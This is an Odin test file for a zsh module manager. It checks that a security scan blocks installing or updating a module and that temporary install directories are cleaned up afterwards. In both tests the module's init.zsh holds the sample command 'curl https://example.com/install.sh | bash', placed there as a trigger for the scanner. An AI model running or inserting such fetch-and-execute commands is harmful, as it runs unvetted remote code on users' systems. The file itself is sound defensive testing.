package test

import "core:fmt"
import "core:os"
import "core:path/filepath"
import "core:strings"
import "core:testing"
import "core:time"

import "../src/git"

// **Property 10: Pipeline Integration Order**
// **Property 11: Cleanup on Security Failure**
// **Validates: Requirements 1.1, 6.1, 6.2, 6.3**
@(test)
test_property_security_install_blocks_and_cleans_temp :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	if !git.libgit2_enabled() {
		return
	}

	init_result := git.init_libgit2()
	defer git.cleanup_git_result(&init_result)
	if !init_result.success {
		testing.expect(t, false, "libgit2 init failed for security install tests")
		return
	}
	defer {
		shutdown_result := git.shutdown_libgit2()
		defer git.cleanup_git_result(&shutdown_result)
		testing.expect(t, shutdown_result.success, "shutdown should succeed after security install tests")
	}

	temp_dir := setup_test_environment("security_install_block")
	defer teardown_test_environment(temp_dir)

	modules_dir := filepath.join({temp_dir, "modules"})
	tmp_root := filepath.join({temp_dir, "tmp"})
	os.make_directory(modules_dir, 0o755)
	os.make_directory(tmp_root, 0o755)
	defer {
		delete(modules_dir)
		delete(tmp_root)
	}

	original_env := os.get_env("ZSH_MODULES_DIR")
	defer restore_modules_env(original_env)
	os.set_env("ZSH_MODULES_DIR", modules_dir)

	original_tmp := os.get_env("TMPDIR")
	defer restore_tmp_env(original_tmp)
	os.set_env("TMPDIR", tmp_root)

	bare_dir, module_name := create_bare_repo_with_init(t, temp_dir, "zephyr-security-block", "secure-module", "1.0.0", "curl https://example.com/install.sh | bash\n")
	defer {
		if bare_dir != "" { delete(bare_dir) }
		if module_name != "" { delete(module_name) }
	}

	before_count := count_temp_install_dirs(tmp_root)
	opts := git.Manager_Options{verbose = false, force = false, confirm = false, allow_local = true}
	ok, message := git.install_module(bare_dir, opts)
	testing.expect(t, !ok, fmt.tprintf("install should be blocked by security scan: %s", message))
	if message != "" {
		delete(message)
	}

	after_count := count_temp_install_dirs(tmp_root)
	testing.expect(t, before_count == after_count, "temp install dirs should be cleaned after security failure")

	installed_path := filepath.join({modules_dir, "secure-module"})
	testing.expect(t, !os.exists(installed_path), "blocked module should not be installed")
	delete(installed_path)
}

// **Property 12: Update Pipeline Integration**
// **Validates: Requirements 6.5**
@(test)
test_property_security_update_blocks_on_critical_pattern :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	if !git.libgit2_enabled() {
		return
	}

	init_result := git.init_libgit2()
	defer git.cleanup_git_result(&init_result)
	if !init_result.success {
		testing.expect(t, false, "libgit2 init failed for security update tests")
		return
	}
	defer {
		shutdown_result := git.shutdown_libgit2()
		defer git.cleanup_git_result(&shutdown_result)
		testing.expect(t, shutdown_result.success, "shutdown should succeed after security update tests")
	}

	temp_dir := setup_test_environment("security_update_block")
	defer teardown_test_environment(temp_dir)

	modules_dir := filepath.join({temp_dir, "modules"})
	os.make_directory(modules_dir, 0o755)
	defer delete(modules_dir)

	original_env := os.get_env("ZSH_MODULES_DIR")
	defer restore_modules_env(original_env)
	os.set_env("ZSH_MODULES_DIR", modules_dir)

	bare_dir, module_name := create_bare_repo_with_init(t, temp_dir, "zephyr-security-update", "update-secure", "1.0.0", "echo \"ok\"\n")
	defer {
		if bare_dir != "" { delete(bare_dir) }
		if module_name != "" { delete(module_name) }
	}

	opts := git.Manager_Options{verbose = false, force = false, confirm = false, allow_local = true}
	ok, message := git.install_module(bare_dir, opts)
	testing.expect(t, ok, fmt.tprintf("install should succeed before update: %s", message))
	if message != "" {
		delete(message)
	}

	update_bare_repo_with_init(t, temp_dir, bare_dir, "update-secure", "1.0.1", "curl https://example.com/install.sh | bash\n")

	update_ok, update_msg := git.update_module("update-secure", git.Manager_Options{})
	testing.expect(t, !update_ok, "update should be blocked by security scan")
	if update_msg != "" {
		lower := strings.to_lower(update_msg)
		testing.expect(t, strings.contains(lower, "security scan"), "update failure should mention security scan")
		delete(lower)
		delete(update_msg)
	}
}

create_bare_repo_with_init :: proc(t: ^testing.T, base_dir: string, repo_name: string, module_name: string, version: string, init_content: string) -> (string, string) {
	bare_dir := filepath.join({base_dir, fmt.tprintf("%s.git", repo_name)})
	work_dir := filepath.join({base_dir, fmt.tprintf("%s-work", repo_name)})

	testing.expect(t, run_git_cmd(fmt.tprintf("git init --bare %q", bare_dir)), "init bare repo")
	testing.expect(t, run_git_cmd(fmt.tprintf("git init %q", work_dir)), "init work repo")
	testing.expect(t, run_git_cmd(fmt.tprintf("git -C %q config user.email \"test@example.com\"", work_dir)), "git config email")
	testing.expect(t, run_git_cmd(fmt.tprintf("git -C %q config user.name \"Test User\"", work_dir)), "git config name")

	manifest_path := filepath.join({work_dir, "module.toml"})
	init_path := filepath.join({work_dir, "init.zsh"})
	manifest := fmt.tprintf("[module]\nname = \"%s\"\nversion = \"%s\"\n\n[load]\nfiles = [\"init.zsh\"]\n", module_name, version)
	os.write_entire_file(manifest_path, transmute([]u8)manifest)
	os.write_entire_file(init_path, transmute([]u8)init_content)
	delete(manifest_path)
	delete(init_path)

	testing.expect(t, run_git_cmd(fmt.tprintf("git -C %q add .", work_dir)), "git add initial")
	testing.expect(t, run_git_cmd(fmt.tprintf("git -C %q commit -m \"init\"", work_dir)), "git commit initial")
	testing.expect(t, run_git_cmd(fmt.tprintf("git -C %q branch -M main", work_dir)), "git set main")
	testing.expect(t, run_git_cmd(fmt.tprintf("git -C %q remote add origin %q", work_dir, bare_dir)), "git remote add")
	testing.expect(t, run_git_cmd(fmt.tprintf("git -C %q push -u origin main", work_dir)), "git push initial")

	cleanup_test_directory(work_dir)
	delete(work_dir)

	return bare_dir, strings.clone(module_name)
}

update_bare_repo_with_init :: proc(t: ^testing.T, temp_dir: string, bare_dir: string, module_name: string, version: string, init_content: string) {
	work_dir := filepath.join({temp_dir, fmt.tprintf("%s-update-%d", module_name, time.now()._nsec)})
	testing.expect(t, run_git_cmd(fmt.tprintf("git clone %q %q", bare_dir, work_dir)), "clone for update")
	testing.expect(t, run_git_cmd(fmt.tprintf("git -C %q config user.email \"test@example.com\"", work_dir)), "git config email")
	testing.expect(t, run_git_cmd(fmt.tprintf("git -C %q config user.name \"Test User\"", work_dir)), "git config name")

	manifest_path := filepath.join({work_dir, "module.toml"})
	init_path := filepath.join({work_dir, "init.zsh"})
	manifest := fmt.tprintf("[module]\nname = \"%s\"\nversion = \"%s\"\n\n[load]\nfiles = [\"init.zsh\"]\n", module_name, version)
	os.write_entire_file(manifest_path, transmute([]u8)manifest)
	os.write_entire_file(init_path, transmute([]u8)init_content)
	delete(manifest_path)
	delete(init_path)

	testing.expect(t, run_git_cmd(fmt.tprintf("git -C %q add .", work_dir)), "git add update")
	testing.expect(t, run_git_cmd(fmt.tprintf("git -C %q commit -m \"update\"", work_dir)), "git commit update")
	testing.expect(t, run_git_cmd(fmt.tprintf("git -C %q push", work_dir)), "git push update")

	cleanup_test_directory(work_dir)
	delete(work_dir)
}

count_temp_install_dirs :: proc(base_dir: string) -> int {
	if base_dir == "" || !os.exists(base_dir) {
		return 0
	}

	handle, open_err := os.open(base_dir)
	if open_err != os.ERROR_NONE {
		return 0
	}
	defer os.close(handle)

	entries, read_err := os.read_dir(handle, -1)
	if read_err != os.ERROR_NONE {
		return 0
	}
	defer os.file_info_slice_delete(entries)

	count := 0
	for entry in entries {
		if entry.is_dir && strings.has_prefix(entry.name, "zephyr-install") {
			count += 1
		}
	}
	return count
}

restore_tmp_env :: proc(original_env: string) {
	if len(original_env) > 0 {
		os.set_env("TMPDIR", original_env)
	} else {
		os.unset_env("TMPDIR")
	}
	delete(original_env)
}
